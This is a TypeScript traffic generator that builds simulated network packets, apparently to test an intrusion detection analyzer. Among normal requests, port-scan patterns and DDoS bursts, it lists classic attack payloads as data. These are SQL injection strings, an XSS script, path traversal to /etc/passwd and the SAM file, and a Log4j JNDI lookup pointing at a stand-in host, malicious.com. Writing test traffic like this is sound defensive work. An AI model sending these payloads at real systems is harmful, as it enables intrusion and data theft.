import { NetworkPacket } from './packetAnalyzer';

// Generate realistic IP addresses
function generateIP(): string {
  return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
}

// Common ports for different services
const commonPorts = {
  HTTP: 80,
  HTTPS: 443,
  SSH: 22,
  FTP: 21,
  SMTP: 25,
  DNS: 53,
  MySQL: 3306,
  PostgreSQL: 5432
};

// Malicious payloads for simulation
const maliciousPayloads = [
  "SELECT * FROM users WHERE username='admin' OR '1'='1'",
  "<script>alert('XSS')</script>",
  "../../etc/passwd",
  "'; DROP TABLE users; --",
  "GET /../../../windows/system32/config/sam",
  "${jndi:ldap://malicious.com/exploit}",
  "admin' UNION SELECT null, username, password FROM users--"
];

const normalPayloads = [
  "GET /api/users HTTP/1.1",
  "POST /login HTTP/1.1",
  "SELECT id, name FROM products WHERE active=1",
  "UPDATE user_settings SET theme='dark' WHERE user_id=123",
  "DNS query: example.com",
  "PING request",
  "SSH authentication request"
];

// Generate a normal network packet
function generateNormalPacket(): NetworkPacket {
  const protocols: Array<'TCP' | 'UDP' | 'ICMP' | 'HTTP' | 'HTTPS'> = ['TCP', 'UDP', 'HTTP', 'HTTPS', 'ICMP'];
  const protocol = protocols[Math.floor(Math.random() * protocols.length)];
  const ports = Object.values(commonPorts);
  
  return {
    id: `pkt_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
    timestamp: Date.now(),
    sourceIP: generateIP(),
    destIP: generateIP(),
    sourcePort: Math.floor(Math.random() * 65535),
    destPort: ports[Math.floor(Math.random() * ports.length)],
    protocol,
    size: Math.floor(Math.random() * 1500) + 64,
    payload: normalPayloads[Math.floor(Math.random() * normalPayloads.length)],
    flags: ['SYN', 'ACK']
  };
}

// Generate a malicious packet (for testing detection)
function generateMaliciousPacket(): NetworkPacket {
  const attackTypes = [
    { type: 'SQL Injection', payload: maliciousPayloads[0], port: 3306 },
    { type: 'XSS Attack', payload: maliciousPayloads[1], port: 80 },
    { type: 'Path Traversal', payload: maliciousPayloads[2], port: 80 },
    { type: 'SQL Injection', payload: maliciousPayloads[3], port: 5432 },
    { type: 'Log4j Exploit', payload: maliciousPayloads[5], port: 8080 }
  ];

  const attack = attackTypes[Math.floor(Math.random() * attackTypes.length)];
  
  return {
    id: `pkt_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
    timestamp: Date.now(),
    sourceIP: generateIP(),
    destIP: '192.168.1.100',
    sourcePort: Math.floor(Math.random() * 65535),
    destPort: attack.port,
    protocol: 'TCP',
    size: Math.floor(Math.random() * 2000) + 500,
    payload: attack.payload,
    flags: ['PSH', 'ACK']
  };
}

// Generate a port scan pattern
function generatePortScanPacket(sourceIP: string, scanIndex: number): NetworkPacket {
  return {
    id: `pkt_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
    timestamp: Date.now(),
    sourceIP,
    destIP: '192.168.1.100',
    sourcePort: Math.floor(Math.random() * 65535),
    destPort: scanIndex,
    protocol: 'TCP',
    size: 64,
    payload: 'SYN scan probe',
    flags: ['SYN']
  };
}

// Generate a DDoS pattern
function generateDDoSPacket(): NetworkPacket {
  return {
    id: `pkt_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
    timestamp: Date.now(),
    sourceIP: generateIP(),
    destIP: '192.168.1.100',
    sourcePort: Math.floor(Math.random() * 65535),
    destPort: 80,
    protocol: 'TCP',
    size: 64,
    payload: 'GET / HTTP/1.1',
    flags: ['SYN']
  };
}

// Traffic generator with realistic patterns
export class TrafficGenerator {
  private isRunning = false;
  private threatProbability = 0.15; // 15% chance of malicious traffic

  generatePacket(): NetworkPacket {
    const random = Math.random();
    
    if (random < this.threatProbability) {
      return generateMaliciousPacket();
    } else {
      return generateNormalPacket();
    }
  }

  generatePortScan(): NetworkPacket[] {
    const sourceIP = generateIP();
    const packets: NetworkPacket[] = [];
    
    // Scan first 20 ports
    for (let i = 1; i <= 20; i++) {
      packets.push(generatePortScanPacket(sourceIP, i));
    }
    
    return packets;
  }

  generateDDoSBurst(): NetworkPacket[] {
    const packets: NetworkPacket[] = [];
    
    // Generate 150 packets in quick succession
    for (let i = 0; i < 150; i++) {
      packets.push(generateDDoSPacket());
    }
    
    return packets;
  }

  setThreatProbability(probability: number) {
    this.threatProbability = Math.max(0, Math.min(1, probability));
  }
}
